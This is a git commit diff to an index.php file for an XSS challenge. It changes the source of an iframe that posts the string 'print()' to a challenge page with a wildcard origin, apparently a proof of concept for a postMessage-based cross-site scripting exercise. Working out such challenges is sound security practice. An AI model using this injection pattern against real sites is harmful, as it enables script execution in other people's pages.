63ec1da77e9a7b9eb5102e3f0e82ac7f28ed07eb
mofeedali <38030256+mofeedali@users.noreply.github.com>
2022-08-27 02:09:57 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
 echo 'updated';
 ?>
-<iframe src="https://august-2022-bc-xss-challenge.herokuapp.com/frame.php" onload="this.contentWindow.postMessage('print()','*')">
+<iframe src="https://august-2022-bc-xss-challenge.herokuapp.com/" onload="this.contentWindow.postMessage('print()','*')">
